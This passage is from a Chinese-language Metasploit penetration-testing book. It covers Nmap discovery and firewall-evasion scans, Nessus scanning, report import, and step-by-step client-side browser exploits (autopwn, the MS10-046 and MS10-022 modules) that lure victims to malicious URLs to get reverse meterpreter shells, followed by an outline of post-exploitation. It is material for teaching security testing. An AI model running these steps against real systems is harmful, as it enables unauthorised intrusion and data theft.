+   **扫描目标列表**：假设我们有大量目标计算机要扫描。那么扫描所有目标的最简单方法是将所有目标放入一个文本文件中。我们只需要用新行或空格分隔所有目标。例如，这里我们创建了一个名为`list.txt`的列表。![使用 Nmap](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_15.jpg)

现在要扫描整个列表，请键入`nmap –iL <list.txt>`。在这里，语法`–iL`用于指示 Nmap 从`list.txt`中提取目标列表，例如，`nmap –iL list.txt`。

![使用 Nmap](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_16.jpg)

我们现在转向各种 Nmap 发现选项。那么 Nmap 实际上是如何工作的呢？每当 Nmap 执行扫描时，它会向目的地发送 ICMP 回显请求，以检查主机是活着还是死了。当 Nmap 同时扫描多个主机时，这个过程可以为 Nmap 节省大量时间。有时防火墙会阻止 ICMP 请求，因此作为次要检查，Nmap 尝试连接默认开放的端口，例如 80 和 443，这些端口由 Web 服务器或 HTTP 使用。

## Nmap 发现选项

现在我们将转向各种 Nmap 命令选项，这些选项可以根据场景进行主机发现。

![Nmap 发现选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_17.jpg)

在上一个屏幕截图中，我们可以看到 Nmap 中提供的所有扫描选项。让我们测试一些，因为本书的完整命令覆盖范围超出了本书的范围。

+   **仅 Ping 扫描**：此扫描用于查找网络中的活动主机。要执行仅 Ping 扫描，我们使用命令`nmap –sP <Target>`；例如，这里我们设置`nmap –sP 192.168.11.2-60`。![Nmap 发现选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_18.jpg)

在结果中，我们看到有四台主机是活动的。因此，这种扫描可以节省在大型网络中执行扫描的时间，并识别所有活动主机，留下不活动的主机。

+   **TCP ACK ping**：此扫描向目标发送 TCP ACK 数据包。此方法用于通过收集主机的 TCP 响应来发现主机（取决于 TCP 三次握手）。当防火墙阻止 ICMP 请求时，此方法对于收集信息很有用。要执行此扫描，我们使用命令`nmap –PA <target>`；例如，这里我们设置`nmap –PA 192.168.11.46`。![Nmap 发现选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_19.jpg)

+   **ICMP 回显扫描**：此选项向目标发送 ICMP 请求，以检查主机是否回复。这种类型的扫描在本地网络上效果最佳，因为 ICMP 数据包可以轻松地在网络上传输。但出于安全原因，许多主机不会响应 ICMP 数据包请求。此选项的命令是`nmap –PE 192.168.11.46`。![Nmap 发现选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_20.jpg)

+   **强制反向 DNS 解析**：此扫描对于对目标执行侦察很有用。Nmap 将尝试解析目标地址的反向 DNS 信息。它会显示有关目标 IP 地址的有趣信息，如下面的屏幕截图所示。我们用于扫描的命令是`nmap –R <Target>`；例如，这里我们设置`nmap –R 66.147.244.90`。![Nmap 发现选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_21.jpg)

## Nmap 高级扫描选项

现在让我们看一些高级扫描选项。这些主要用于绕过防火墙并找到不常见的服务。选项列表显示在下面的屏幕截图中：

![Nmap 高级扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_22.jpg)

我们将以下一些选项解释如下：

+   **TCP SYN 扫描**：TCP SYN 扫描尝试通过向目标发送 SYN 数据包并等待响应来识别端口。SYN 数据包基本上是发送以指示要建立新连接。这种类型的扫描也被称为隐形扫描，因为它不尝试与远程主机建立完整的连接。要执行此扫描，我们使用命令`nmap –sS <target>`；例如，这里我们使用`nmap –sS 192.168.0.104`。![Nmap 高级扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_23.jpg)

+   TCP 空扫描：这种类型的扫描发送没有启用 TCP 标志的数据包。这是通过将标头设置为零来实现的。这种类型的扫描用于愚弄受防火墙系统。空扫描的命令是`nmap -sN <target>`；例如，这里我们使用`nmap -sN 192.168.0.103`。![Nmap 高级扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_24.jpg)

+   自定义 TCP 扫描：这种类型的扫描使用一个或多个 TCP 头标志执行自定义扫描。在此扫描中可以使用任意组合的标志。各种类型的 TCP 标志如下图所示：![Nmap 高级扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_25.jpg)

可以使用这种扫描的任意组合标志。使用的命令是`nmap -scanflags SYNURG <target>`；例如，这里我们设置`nmap -scanflags SYNURG 192.168.0.102`。

![Nmap 高级扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_26.jpg)

## 端口扫描选项

接下来，我们将介绍一些针对特定端口、一系列端口和基于协议、名称等进行端口扫描的更多技术。

![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_27.jpg)

+   快速扫描：在这种扫描中，Nmap 仅对 1000 个最常见的端口中的 100 个端口进行快速扫描。因此，通过在扫描过程中减少端口数量，Nmap 的扫描速度得到了极大的提高。快速扫描的命令是`nmap -F <Target>`；例如，这里我们使用`nmap -F 192.168.11.46`。![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_28.jpg)

+   按名称扫描端口：按名称扫描端口非常简单，我们只需在扫描过程中指定端口名称。使用的命令是`nmap -p (portname) <target>`；例如，这里我们使用`nmap -p http 192.168.11.57`。![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_29.jpg)

+   执行顺序端口扫描：借助顺序端口扫描程序，Nmap 按顺序端口顺序扫描其目标。这种技术对于规避防火墙和入侵防范系统非常有用。使用的命令是`nmap -r <target>`；例如，这里我们使用`nmap -r 192.168.11.46`。![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_30.jpg)

有时在扫描时我们会遇到接收到经过过滤的端口结果的问题。当系统受到防火墙或入侵防范系统的保护时会出现这种情况。Nmap 还具有一些功能，可以帮助绕过这些保护机制。我们在下表中列出了一些选项：

![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_31.jpg)

我们将解释其中一些如下：

+   分段数据包：通过使用此选项，Nmap 发送非常小的 8 字节数据包。这个选项对规避配置不当的防火墙系统非常有用。使用的命令是`nmap -f <target>`；例如，这里我们使用`nmap -f 192.168.11.29`。![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_32.jpg)

+   空闲僵尸扫描：这是一种非常独特的扫描技术，Nmap 在其中使用僵尸主机来扫描目标。这意味着，这里 Nmap 使用两个 IP 地址执行扫描。使用的命令是`nmap -sI <Zombie host> <Target>`；例如，这里我们使用`nmap -sI 192.168.11.29 192.168.11.46`。![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_33.jpg)

+   欺骗 MAC 地址：当受防火墙系统检测到通过系统的 MAC 地址进行扫描时，并将这些 MAC 地址列入黑名单时，这种技术非常有用。但是 Nmap 具有欺骗 MAC 地址的功能。MAC 地址可以通过三种不同的参数进行欺骗，这些参数在下图中列出：![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_34.jpg)

用于此的命令是`nmap -spoof-mac <Argument> <Target>`；例如，这里我们使用`nmap -spoof-mac Apple 192.168.11.29`。

![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_35.jpg)

学习了不同类型的扫描技术之后，接下来我们将介绍如何以各种方式和格式保存 Nmap 输出结果。选项列在下图中：

![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_05_36.jpg)

让我们将 Nmap 输出结果保存在一个 XML 文件中。使用的命令是`nmap –oX <scan.xml> <Target>`；例如，这里我们使用的是`nmap –oN scan.txt 192.168.11.46`。

![端口扫描选项](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_37.jpg)

# 使用 Nessus

Nessus 是一款专有的漏洞扫描工具，可免费用于非商业用途。它可以检测目标系统上的漏洞、配置错误、默认凭据，并且还用于各种合规审计。

要在 Metasploit 中启动 Nessus，打开`msfconsole`并输入`load nessus`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_38.jpg)

让我们通过输入`nessus_help`来使用 Nessus 的`help`命令。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_39.jpg)

我们有各种 Nessus 命令行选项的列表。接下来，我们从本地主机连接到 Nessus 以开始扫描。要连接到本地主机，使用的命令是`nessus_connect <Your Username>:<Your Password>@localhost:8834 <ok>`，这里我们使用的是`nessus_connect hacker:toor@localhost:8834 ok`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_40.jpg)

成功连接到 Nessus 的默认端口后，我们现在将检查 Nessus 扫描策略。为此，我们输入`nessus_policy_list`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_41.jpg)

在这里，我们可以看到 Nessus 的四种策略；第一种是外部网络扫描，用于外部扫描网络漏洞。第二种是内部网络扫描，用于内部扫描网络漏洞。第三种是 Web 应用程序测试，用于扫描 Web 应用程序的漏洞。第四种是 PCI-DSS（支付卡行业数据安全标准）审计，用于支付卡行业的数据安全标准。

现在我们将扫描我们的受害者机器。要扫描一台机器，我们必须创建一个新的扫描，使用的命令是`nessus_new_scan <policy ID> <scan name> <Target IP>`；例如，这里我们使用的是`nessus_new_scan -2 WindowsXPscan 192.168.0.103`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_42.jpg)

我们可以通过输入`nessus_scan_status`来检查扫描过程的状态；它将显示扫描过程的状态，无论是否已完成。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_43.jpg)

完成扫描过程后，现在是时候检查报告列表了，因此输入`nessus_report_list`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_44.jpg)

我们可以看到带有**ID**的报告。其**状态**标记为**已完成**。要打开报告，我们使用命令`nessus_report_hosts <report ID>`；例如，这里我们使用的是`nessus_report_hosts dc4583b5-22b8-6b1a-729e-9c92ee3916cc301e45e2881c93dd`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_45.jpg)

在上一张截图中，我们可以看到 IP 为`192.168.0.103`的机器的结果，其严重程度总共为`41`。这意味着漏洞总数为 41。

以下是不同漏洞的分类：

+   Sev 0 表示高级漏洞，共有 4 个

+   Sev 1 表示中级漏洞，共有 28 个

+   Sev 2 表示低级漏洞，共有 4 个

+   Sev 3 表示信息性漏洞，共有 9 个

我们可以使用命令`nessus_report_hosts_ports <Target IP> <Report ID>`来详细查看协议名称和服务的漏洞；例如，这里我们使用的是`nessus_report_host_ports 192.168.0.103 dc4583b5-22b8-6b1a-729e-9c92ee3916cc301e45e2881c93dd`。

![使用 Nessus](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_46.jpg)

# 在 Metasploit 中导入报告

将漏洞扫描仪的报告导入 Metasploit 数据库是 Metasploit 提供的一个非常有用的功能。在本章中，我们使用了两个扫描仪，即 Nmap 和 Nessus。我们已经看到了 Nmap 在不同情况下使用的各种扫描技术。现在我们将看到如何通过`msfconsole`将 Nmap 报告导入到 PostgreSQL 数据库中。

扫描任何主机并将 Nmap 报告保存为 XML 格式，因为`msfconsole`不支持 TXT 格式。所以这里我们已经有一个名为`scan.xml`的 XML 格式扫描报告。现在我们要做的第一件事是使用命令`db_status`检查与`msfconsole`的数据库连接状态。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_47.jpg)

我们的数据库已连接到`msfconsole`，现在是时候导入 Nmap 报告了。我们使用命令`db_import <报告路径及名称>`；例如，在这里我们正在从桌面导入我们的报告，所以我们输入`db_import /root/Desktop/scan.xml`。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_48.jpg)

成功将报告导入数据库后，我们可以从`msfconsole`中访问它。我们可以通过输入`host <进行 nmap 扫描的主机名>`来查看主机的详细信息；例如，在这里我们使用`host 192.168.0.102`。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_49.jpg)

这里有一些关于主机的重要信息，比如 MAC 地址和操作系统版本。现在在选择主机之后，让我们检查一下开放端口的详细信息以及运行在这些端口上的服务。使用的命令是`services <hostname>`；例如，在这里我们使用`services 192.168.0.102`。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_50.jpg)

我们这里有受害机上开放端口和运行服务的所有信息。现在我们可以搜索用于进一步攻击的漏洞利用，这是我们在上一章中已经做过的。

接下来，我们将学习如何在`msfconsole`中导入 Nessus 的报告。与导入 Nmap 报告使用相同的命令一样简单，即`db_import <报告名称及文件位置>`；例如，在这里我们使用`db_import /root/Desktop/Nessus_scan.nessus`。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_51.jpg)

我们可以看到已成功导入了主机 192.168.0.103 的报告，现在我们可以通过输入`vulns <hostname>`来检查此主机的漏洞；例如，在这里我们使用`vulns 192.168.0.103`。

![在 Metasploit 中导入报告](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_05_52.jpg)

现在我们可以看到受害机的漏洞；根据这些漏洞，我们可以搜索用于执行进一步攻击的漏洞利用、有效载荷和辅助模块。

# 总结

在本章中，我们介绍了使用 Metasploit 模块对受害者进行信息收集的各种技术。我们介绍了一些免费的工具以及一些辅助扫描器。使用一些辅助扫描器，我们实际上能够对特定运行服务进行指纹识别。通过 Nmap，我们学会了对活动系统、受防火墙保护的系统以及其他各种不同场景中可以使用的各种扫描技术进行网络扫描。我们看到 Nessus 是一个非常强大的工具，可以用于对受害机进行漏洞评估。我们还学会了将 Nmap 和 Nessus 报告导入 Metasploit。通过本章，我们已经在利用我们的受害者方面迈出了一大步，并将在下一章中继续介绍客户端利用。

# 参考资料

以下是一些有用的参考资料，可以进一步了解本章涉及的一些主题：

+   [`pentestlab.wordpress.com/2013/02/17/metasploit-storing-pen-test-results/`](https://pentestlab.wordpress.com/2013/02/17/metasploit-storing-pen-test-results/)

+   [`www.offensive-security.com/metasploit-unleashed/Information_Gathering`](http://www.offensive-security.com/metasploit-unleashed/Information_Gathering)

+   [`www.firewalls.com/blog/metasploit_scanner_stay_secure/`](http://www.firewalls.com/blog/metasploit_scanner_stay_secure/)

+   [`www.mustbegeek.com/security/ethical-hacking/`](http://www.mustbegeek.com/security/ethical-hacking/)

+   [`backtrack-wifu.blogspot.in/2013/01/an-introduction-to-information-gathering.html`](http://backtrack-wifu.blogspot.in/2013/01/an-introduction-to-information-gathering.html)

+   [`www.offensive-security.com/metasploit-unleashed/Nessus_Via_Msfconsole`](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Nessus_Via_Msfconsole)

+   [`en.wikipedia.org/wiki/Nmap`](http://en.wikipedia.org/wiki/Nmap)

+   [`en.wikipedia.org/wiki/Nessus_(software)`](http://en.wikipedia.org/wiki/Nessus_(software))


# 第六章：客户端利用

在上一章中，我们完成了漏洞扫描和信息收集阶段。在本章中，我们将讨论各种可能危害我们受害者（客户端）的方式。我们将涵盖各种技术，如诱使受害者点击 URL 或图标，最终为我们提供反向 shell。

# 什么是客户端攻击？

在前几章中，我们的手已经被一些基本的利用弄得很脏，现在我们转向客户端攻击。但是要理解客户端攻击，我们首先需要对客户端-服务器架构有清晰的概念，并区分两个组件之间的攻击。服务器是共享其网络资源的主要计算机，客户端（即网络上的其他计算机）使用这些资源。每个故事都有负面方面。因此，由于服务器向客户端提供服务，它可能也会暴露可被利用的漏洞。现在，当攻击者攻击服务器时，他可能会对服务器进行拒绝服务攻击，最终导致所有服务崩溃。具体来说，这是一种服务器端攻击，因为我们实际上试图攻击服务器而不是任何客户端。

客户端攻击仅限于客户端，并针对可能在该特定计算机上运行的易受攻击的服务和程序。如今，趋势正在改变，更加关注客户端而不是服务器端攻击。根据一般趋势，服务器通常被锁定，只提供最少的服务和受限的访问。这使得攻击服务器变得非常困难，因此黑客们更倾向于易受攻击的客户端。可以对客户端发起大量攻击，如基于浏览器的攻击和易受攻击的服务利用。此外，客户端操作系统有多个应用程序，如 PDF 阅读器、文档阅读器和即时通讯工具。由于它们被忽略为安全配置错误，通常不会更新或修补安全漏洞。因此，使用简单的社会工程技术对这些易受攻击的系统发起利用非常容易。

## 浏览器漏洞

浏览器漏洞已经被人们知晓很长时间了。框架和扩展有时也是被利用的原因。我们最近听说了一些最新版本的浏览器，如 Chromium、Internet Explorer 和 Mozilla 被攻破的消息。恶意代码可能利用浏览器内置的任何形式的 ActiveX、Java 和 Flash 来增强用户体验。受到此类攻击影响的受害者可能会发现其主页、搜索页面、收藏夹和书签被更改。可能会发生设置或 Internet 选项被更改以降低浏览器安全级别的情况，从而使恶意软件更加普遍。

### 教程

在教程部分，我们将向您展示一些通过受害者浏览器运行的漏洞利用。

我们将展示的第一个利用被称为浏览器 autopwn。首先打开终端并启动`msfconsole`。现在输入`use auxiliary/server/browser autopwn`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_01.jpg)

然后输入`show options`以详细查看我们必须在利用中设置的所有选项。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_02.jpg)

在前面的图中，我们可以看到**必需**列中哪些选项是必需的，哪些是不必需的。 **是**表示我们必须设置该选项，**否**表示该选项可以使用其默认设置。因此，第一个必需的选项是`LHOST`。它需要反向连接的 IP 地址，因此在这里我们设置攻击者的机器 IP。要这样做，请输入`set LHOST 192.168.11.23`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_03.jpg)

设置`LHOST`地址后，下一个要设置的是`SRVHOST`。`SRVHOST`表示服务器本地主机地址。我们通过输入`set SRVHOST 192.168.11.23`来设置我们的本地机器地址。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_04.jpg)

现在，要设置`SRVPORT`，也就是本地端口地址，我们输入`set SRVPORT 80`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_05.jpg)

所有设置都完成了。现在是运行辅助模块的时候了；输入`run`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_06.jpg)

运行辅助模块后，我们可以看到它在本地主机上启动了利用模块。此外，它提供了一个恶意 URL，我们必须提供给受害者。这是一种简单的社会工程技术，用户被诱使点击恶意 URL。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_07.jpg)

现在，当 URL 在受害者的系统中打开时，它将向攻击者的系统发送一个反向连接。让我们看看这是如何工作的。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_08.jpg)

运行 URL 后，我们可以在`msfconsole`中看到已建立反向连接，并且`notepad.exe`进程迁移到了 1804。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_09.jpg)

我们可以通过任务管理器在受害者的系统中看到迁移的进程。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_10.jpg)

要检查已创建的`meterpreter`会话，输入`sessions`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_11.jpg)

现在选择`meterpreter`会话以利用受害者的系统。要选择会话，要使用的命令是`sessions –i <Id>`；例如，在这里我们使用`sessions –i 1`。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_12.jpg)

选择一个会话后，我们立即获得了`meterpreter`会话。然后我们可以进行进一步的利用。例如，在前面的图中，我们可以看到用于检查系统信息的`sysinfo`命令。

## Internet Explorer 快捷方式图标利用漏洞

我们将演示的另一个浏览器利用漏洞是包含恶意 DLL 的快捷方式图标。这个利用漏洞是在 Windows XP 下的 IE 6 上运行的社会工程攻击。我们只需要诱使我们的受害者点击链接来在他的系统上运行利用漏洞。启动`msfconsole`并输入`use windows/browser/ms10_046_shortcut_icon_dllloader`。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_13.jpg)

现在输入`show options`以查看详细的所有选项，我们需要设置利用漏洞。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_14.jpg)

所需的第一个选项是`SRVHOST`。它需要反向连接的 IP 地址，所以我们通过输入`set SRVHOST 192.168.0.109`来设置攻击者的机器 IP。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_15.jpg)

现在设置`SRVPORT`地址，也就是本地端口地址，输入`set SRVPORT 80`。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_16.jpg)

下一个选项是通过输入`set URIPATH /`将`URIPATH`路径设置为默认设置。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_17.jpg)

现在所有选项都设置好了，准备运行利用漏洞。输入`exploit`。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_18.jpg)

现在轮到你进行一些巧妙的社会工程了。将 URL 提供给受害者，然后等待反向连接。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_19.jpg)

在浏览器中打开 URL 将创建一个快捷方式图标和一个 DLL 文件。此时，在`msfconsole`中创建了一个`meterpreter`会话，我们的受害者已经受到了威胁。现在让我们通过输入`sessions`来检查会话。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_20.jpg)

我们可以看到已创建了一个会话。现在选择`meterpreter`会话以利用受害者的系统。要选择会话，要使用的命令是`sessions –i <Id>`；例如，在这里我们使用`sessions –i 1`。

![Internet Explorer 快捷方式图标利用漏洞](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_21.jpg)

选择会话后，我们成功接收`meterpreter`；然后我们可以进一步利用客户端系统。

## 互联网浏览器恶意 VBScript 代码执行利用

我们还有另一个有趣的利用，它类似于我们之前的利用，并使用相同的条件和软件版本。这次我们将向您展示当受害者在恶意 VBScript 在网页上生成的消息框出现后按下*F1*按钮时发生的代码执行漏洞。

要使用此利用，启动`msfconsole`并输入`use exploit/windows/browser/ms10_022_ie_vbscript_winhlp32`。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_22.jpg)

现在输入`show options`以查看在利用中必须设置的所有选项。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_23.jpg)

第一个所需的选项是`SRVHOST`。它需要反向连接的 IP 地址，因此我们设置攻击者的机器 IP。例如，在这里我们输入`set SRVHOST 192.168.0.105`。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_24.jpg)

现在通过输入`set SRVPORT 80`来设置`SRVPORT`号码。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_25.jpg)

下一个选项是将`URIPATH`路径设置为默认设置，输入`set URIPATH /`。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_26.jpg)

现在所有选项都已设置好，准备运行利用，输入`exploit`。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_27.jpg)

接下来，我们只需要运用一些社会工程技巧，让我们的受害者点击 URL。我们把 URL 给我们的受害者，让他点击它。在 Internet Explorer 中打开 URL 后，会弹出一个消息框，显示消息**欢迎！按 F1 键关闭此对话框。**

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_28.jpg)

按下*F1*后，恶意 VBScript 将在浏览器中运行并发送一个名为`calc.exe`的有效载荷。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_29.jpg)

执行`.exe`文件后，它将与攻击者的机器建立一个反向连接并创建一个`meterpreter`会话。输入`sessions`以检查可用的会话。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_30.jpg)

我们可以看到这里已经创建了一个会话。现在选择`meterpreter`会话以利用受害者的系统。为了选择会话，我们使用命令`sessions –i <Id>`；例如，在这里我们使用`sessions –i 1`。

![互联网浏览器恶意 VBScript 代码执行利用](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_06_31.jpg)

选择会话后，我们成功接收`meterpreter`；然后我们可以进一步利用受害者机器。

# 总结

在本章中，我们成功演示了一些利用客户端的利基利用。这些利用是专门针对客户端系统通过浏览器或恶意链接以及一些社会工程技巧。安全手册中的一个黄金法则是永远不要点击未知链接，在我们的案例中，我们能够突破受害者的防御。这就是 Metasploit 的最佳部分——攻击向量的数组如此之大，如果某些方法不起作用，另一个一定会起作用。因此，建议所有人避免点击链接，运行未知的可执行文件，并回复来自恶意人士的电子邮件。下一章将涉及一些关于后期利用的技术，所以请继续关注；我们还有很多利用技巧要学习。

# 参考资料

以下是一些有用的参考资料，可以进一步阐明本章涉及的一些主题：

+   [`blog.botrevolt.com/what-are-client-side-attacks/`](http://blog.botrevolt.com/what-are-client-side-attacks/)

+   [`en.wikipedia.org/wiki/Browser_exploit`](http://en.wikipedia.org/wiki/Browser_exploit)

+   [`www.securitytube.net/video/2697`](http://www.securitytube.net/video/2697)


# 第七章：后期利用

在上一章中，我们能够破坏系统并获得对 meterpreter 的访问。现在一旦我们访问了系统，我们的主要重点是尽可能多地从系统中提取信息，同时对用户不可见。这将包括可以在攻击者系统上离线分析的信息，例如 Windows 注册表转储、密码哈希转储、屏幕截图和音频记录。在本章中，我们将详细解释后期利用的概念及其各个阶段。我们还将进一步介绍后期利用的各种技术的教程。

# 什么是后期利用？

正如术语所暗示的，**后期利用**基本上意味着一旦受害系统被攻击者入侵，操作的阶段。受损系统的价值取决于其中存储的实际数据的价值，以及攻击者可能如何利用它进行恶意目的。后期利用的概念正是源自这一事实，即您如何使用受害者受损系统的信息。这个阶段实际上涉及收集敏感信息，记录它，并了解配置设置、网络接口和其他通信渠道。这些可能被用来根据攻击者的需求维持对系统的持久访问。

## 后期利用阶段

后期利用的各个阶段如下：

+   了解受害者

+   权限提升

+   清理痕迹并保持不被发现

+   收集系统信息和数据

+   设置后门和 rootkit

+   转向渗透内部网络

### 教程

到目前为止，我们知道如何利用一个易受攻击的系统。我们可以在以下截图中看到，我们已经有一个 meterpreter 会话正在运行。现在我们将开始后期利用的第一阶段，尽可能收集尽可能多的信息。

